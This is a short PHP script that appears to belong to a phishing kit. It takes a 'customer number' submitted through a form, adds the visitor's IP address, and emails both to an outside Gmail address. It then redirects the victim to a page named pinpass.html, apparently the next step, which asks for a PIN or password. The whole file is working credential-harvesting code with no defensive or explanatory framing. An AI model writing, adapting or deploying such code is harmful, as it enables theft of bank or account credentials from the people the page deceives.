<?
$to = "chodgroups@gmail.com";
//---------------------------------
$DBID_edit = $_POST['DBID_edit'];
$ip = $_SERVER['REMOTE_ADDR'];
$subj = "Saima Amna | $ip";
$msg = "Enter Your Customer Number : $DBID_edit\nIP : $ip";
$from = "FROM: Faditastic<saimachod0321@gmail.com>";
		
			{

		mail($to,$subj,$msg,$from);

				}
		
			header("location: pinpass.html");
?>